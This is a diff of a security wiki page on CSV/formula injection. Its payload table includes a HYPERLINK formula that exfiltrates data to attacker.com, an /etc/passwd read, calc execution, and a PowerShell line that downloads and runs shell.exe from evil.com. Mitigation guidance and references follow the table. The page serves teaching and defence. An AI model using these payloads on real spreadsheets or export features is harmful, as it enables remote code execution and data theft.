-<td>&lsquo;/C powershell IWR &ldquo;<a href="http://evil.com/shell.exe" target="_blank" rel="noreferrer noopener nofollow">http://evil.com/shell.exe</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">&rdquo; -O &ldquo;$env:Temp\shell.exe&rdquo;; Start-Process &ldquo;$env:Temp\shell.exe&rdquo;&rsquo;!A1`</td>
-</tr>
-<tr>
-<td>Breakout / New Cell</td>
-<td>`&quot;,&quot;=cmd</td>
-<td>&rsquo; /C calc&rsquo;!A0`</td>
-</tr>
-</tbody>
+	<thead>
+			<tr>
+					<th>Scenario</th>
+					<th>Payload</th>
+					<th>Expected Outcome</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>Command Execution</td>
+					<td>`=cmd</td>
+					<td>&rsquo; /C calc&rsquo;!A0`</td>
+			</tr>
+			<tr>
+					<td>Data Exfiltration</td>
+					<td><code>=HYPERLINK(&quot;&lt;http://attacker.com?v=&quot;&amp;A1,&quot;Click&gt;&quot;)</code></td>
+					<td>Data sent to attacker when clicked</td>
+			</tr>
+			<tr>
+					<td>Obfuscated Exec</td>
+					<td>`@SUM(1+9)*cmd</td>
+					<td>&rsquo; /C calc&rsquo;!A0`</td>
+			</tr>
+			<tr>
+					<td>File Read (Linux)</td>
+					<td><code>='file://etc/passwd'#$passwd.A1</code></td>
+					<td>Displays system file contents</td>
+			</tr>
+			<tr>
+					<td>Remote Download + Exec</td>
+					<td>`=cmd</td>
+					<td>&lsquo;/C powershell IWR &ldquo;<a href="http://evil.com/shell.exe" target="_blank" rel="noreferrer noopener nofollow">http://evil.com/shell.exe</a><img src="/svg/icons8-external-link.svg" style="height: 15px;">&rdquo; -O &ldquo;$env:Temp\shell.exe&rdquo;; Start-Process &ldquo;$env:Temp\shell.exe&rdquo;&rsquo;!A1`</td>
+			</tr>
+			<tr>
+					<td>Breakout / New Cell</td>
+					<td>`&quot;,&quot;=cmd</td>
+					<td>&rsquo; /C calc&rsquo;!A0`</td>
+			</tr>
+	</tbody>
 </table>
 <hr>
-<h2 id="impact">
-  Impact
-  <a class="anchor" href="#impact">#</a>
-</h2>
+<h2 id="impact">Impact<a class="anchor" href="#impact">#</a></h2>
 <ul>
 <li>Execute arbitrary commands on victim&rsquo;s machine (RCE).</li>
 <li>Exfiltrate sensitive spreadsheet or system data.</li>
@@ -1572,10 +1479,7 @@ John Doe,john@example.com,Regular user
 <li>Chain with other attacks for domain-wide impact.</li>
 </ul>
 <hr>
-<h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
+<h2 id="tools">Tools<a class="anchor" href="#tools">#</a></h2>
 <ul>
 <li><strong>Burp Suite</strong> (Intruder with CSV payload lists)</li>
 <li><strong>Custom Python scripts</strong> for CSV sanitization testing</li>
@@ -1583,59 +1487,38 @@ John Doe,john@example.com,Regular user
 <li><strong>Excel/LibreOffice</strong> for manual verification</li>
 </ul>
 <hr>
-<h2 id="mitigation--prevention">
-  Mitigation &amp; Prevention
-  <a class="anchor" href="#mitigation--prevention">#</a>
-</h2>
-<h3 id="input-validation">
-  Input Validation
-  <a class="anchor" href="#input-validation">#</a>
-</h3>
+<h2 id="mitigation--prevention">Mitigation &amp; Prevention<a class="anchor" href="#mitigation--prevention">#</a></h2>
+<h3 id="input-validation">Input Validation<a class="anchor" href="#input-validation">#</a></h3>
 <ul>
 <li><strong>Allowlist</strong>: Alphanumeric + safe characters only.</li>
 <li><strong>Block</strong>: <code>= + - @ \t \r \n</code> and full-width variants.</li>
 </ul>
-<h3 id="output-sanitization-preferred">
-  Output Sanitization (Preferred)
-  <a class="anchor" href="#output-sanitization-preferred">#</a>
-</h3>
+<h3 id="output-sanitization-preferred">Output Sanitization (Preferred)<a class="anchor" href="#output-sanitization-preferred">#</a></h3>
 <ul>
 <li>Prefix every field with <code>'</code> (single quote) inside quotes: <code>&quot;'=dangerous&quot;</code></li>
 <li>Excel-resistant: Prefix with tab (<code>\t</code>) inside quoted field: <code>&quot;\t=formula&quot;</code></li>
 <li>Wrap all fields in double quotes and escape internal quotes: <code>&quot;field&quot;&quot;with&quot;&quot;quote&quot;</code></li>
 </ul>
-<h3 id="parameterized--safe-export-libraries">
-  Parameterized / Safe Export Libraries
-  <a class="anchor" href="#parameterized--safe-export-libraries">#</a>
-</h3>
+<h3 id="parameterized--safe-export-libraries">Parameterized / Safe Export Libraries<a class="anchor" href="#parameterized--safe-export-libraries">#</a></h3>
 <ul>
 <li>Use libraries that auto-escape (but verify—many do not by default).</li>
 <li>In Python (pandas/csv): Pre-process with <code>=</code>, <code>+</code>, etc. removal or prefixing.</li>
 <li>In PHP/Java/Node: Implement OWASP-recommended escaping.</li>
 </ul>
-<h3 id="least-privilege--configuration">
-  Least Privilege &amp; Configuration
-  <a class="anchor" href="#least-privilege--configuration">#</a>
-</h3>
+<h3 id="least-privilege--configuration">Least Privilege &amp; Configuration<a class="anchor" href="#least-privilege--configuration">#</a></h3>
 <ul>
 <li>Warn users before opening CSVs.</li>
 <li>Disable DDE in enterprise Excel policies.</li>
 <li>Rate-limit exports.</li>
 <li>Use non-spreadsheet formats (JSON, PDF) where possible.</li>
 </ul>
-<h3 id="secure-configurations">
-  Secure Configurations
-  <a class="anchor" href="#secure-configurations">#</a>
-</h3>
+<h3 id="secure-configurations">Secure Configurations<a class="anchor" href="#secure-configurations">#</a></h3>
 <ul>
 <li>Validate all exportable fields, not just direct inputs.</li>
 <li>Scan exported files server-side for formulas before serving.</li>
 </ul>
 <hr>
-<h2 id="good-to-read">
-  Good To Read:
-  <a class="anchor" href="#good-to-read">#</a>
-</h2>
+<h2 id="good-to-read">Good To Read:<a class="anchor" href="#good-to-read">#</a></h2>
 <p>HackerOne/Bugcrowd reports on CSV Injection in export features.</p>
 <ul>
 <li><a href="https://hackerone.com/reports/1748961" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/1748961</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -1643,10 +1526,7 @@ John Doe,john@example.com,Regular user
 <li><a href="https://hackerone.com/reports/111192" target="_blank" rel="noreferrer noopener nofollow">https://hackerone.com/reports/111192</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 </ul>
 <hr>
-<h2 id="references">
-  References:
-  <a class="anchor" href="#references">#</a>
-</h2>
+<h2 id="references">References:<a class="anchor" href="#references">#</a></h2>
 <ul>
 <li><a href="https://owasp.org/www-community/attacks/CSV_Injection" target="_blank" rel="noreferrer noopener nofollow">https://owasp.org/www-community/attacks/CSV_Injection</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
 <li><a href="https://payatu.com/blog/csv-injection-basic-to-exploit/" target="_blank" rel="noreferrer noopener nofollow">https://payatu.com/blog/csv-injection-basic-to-exploit/</a><img src="/svg/icons8-external-link.svg" style="height: 15px;"></li>
@@ -1664,49 +1544,62 @@ John Doe,john@example.com,Regular user
         
   <div class="flex flex-wrap justify-between">
 
-
-  <div><a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/commit/d2c880c4a57b9b433287f413f6e6111ca829ffdd" title='Last modified by banditSaurabh | August 5, 2026' target="_blank" rel="noopener">
-      <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>August 5, 2026</span>
-    </a>
-  </div>
-
-
-
-  <div>
-    <a class="flex align-center" href="https://github.com/payatu/cybersec-wiki/edit/main/content/docs/application-security/web/CSV%20Injection.md" target="_blank" rel="noopener">
-      <img src="/svg/edit.svg" class="book-icon" alt="Edit" />
-      <span>Edit this page</span>
-    </a>
-  </div>
-
+<div>
 
 </div>
 
+<div>
 
+</div>
 
-  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>
+</div>
 
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/application-security/web/Cross-Site-Scripting-XSS/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>Cross-Site Scripting (XSS)</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/application-security/web/Denial-of-Service-DOS/" class="flex align-center">
+        <span>Denial of Service (DOS)</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
 
  
         
-      </footer>
-
-      
   
   <div class="book-comments">
 
 </div>
   
  
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
 
       <label for="menu-control" class="hidden book-menu-overlay"></label>
     </div>
 
     
-    <aside class="book-toc">
-      <div class="book-toc-content">
-        
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
   
 <nav id="TableOfContents">
   <ul>
@@ -1766,15 +1659,24 @@ John Doe,john@example.com,Regular user
 </nav>
 
 
+
+    </div>
+  </aside>
+  
  
-      </div>
-    </aside>
-    
   </main>
 
   
 </body>
 </html>
+
+
+
+
+
+
+
+
 
 
 
